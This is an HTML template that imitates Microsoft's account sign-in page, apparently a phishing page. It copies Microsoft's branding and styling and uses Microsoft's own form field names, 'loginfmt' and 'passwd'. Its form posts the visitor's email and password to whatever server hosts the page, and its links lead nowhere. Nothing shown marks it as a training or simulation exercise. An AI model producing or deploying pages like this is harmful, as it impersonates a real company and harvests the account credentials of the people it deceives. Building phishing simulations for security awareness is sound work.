<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #fff; font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; color: #1b1b1b; min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #f2f2f2; }
  .outer { display: flex; align-items: center; justify-content: center; min-height: 100vh; width: 100%; background: linear-gradient(135deg, #f2f2f2 50%, #e6e6e6 100%); }
  .card { background: #fff; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.15); }
  .logo { font-size: 20px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; letter-spacing: -.3px; }
  .logo span { font-weight: 400; }
  h2 { font-size: 24px; font-weight: 600; margin: 16px 0 8px; }
  .form-group { margin-bottom: 20px; }
  .form-group input { width: 100%; padding: 8px 10px; border: none; border-bottom: 1px solid #666; font-size: 15px; font-family: inherit; outline: none; background: transparent; }
  .form-group input:focus { border-bottom: 2px solid #0078d4; margin-bottom: -1px; }
  .error-msg { color: #e81123; font-size: 13px; margin-bottom: 16px; }
  .no-account { font-size: 13px; color: #1b1b1b; margin-bottom: 24px; }
  .no-account a { color: #0067b8; text-decoration: none; }
  .no-account a:hover { text-decoration: underline; }
  .btn-next { display: block; width: auto; padding: 8px 36px; background: #0078d4; color: #fff; border: none; font-size: 15px; font-family: inherit; cursor: pointer; float: right; }
  .btn-next:hover { background: #006cbe; }
  .forgot { margin-top: 12px; }
  .forgot a { font-size: 13px; color: #0067b8; text-decoration: none; }
  .forgot a:hover { text-decoration: underline; }
  .clearfix::after { content: ""; display: table; clear: both; }
  .footer-links { margin-top: 40px; font-size: 12px; color: #706e6b; }
  .footer-links a { color: #706e6b; text-decoration: none; margin-right: 12px; }
  .footer-links a:hover { text-decoration: underline; }
</style>
</head>
<body>
<div class="outer">
  <div class="card">
    <div class="logo">Microsoft</div>
    <h2>Sign in</h2>
    {% if error_message %}
    <div class="error-msg">{{ error_message }}</div>
    {% endif %}
    <form method="post">
      <input type="hidden" name="_csrf" value="{{ csrf_token }}">
      <div class="form-group">
        <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" autocomplete="username" required>
      </div>
      <div class="form-group">
        <input type="password" name="passwd" placeholder="Password" autocomplete="current-password" required>
      </div>
      <div class="no-account">No account? <a href="#">Create one!</a></div>
      <div class="forgot"><a href="#">Can't access your account?</a></div>
      <div class="clearfix" style="margin-top: 24px;">
        <button type="submit" class="btn-next">Sign in</button>
      </div>
    </form>
    <div class="footer-links">
      <a href="#">Terms of use</a>
      <a href="#">Privacy &amp; cookies</a>
    </div>
  </div>
</div>
</body>
</html>
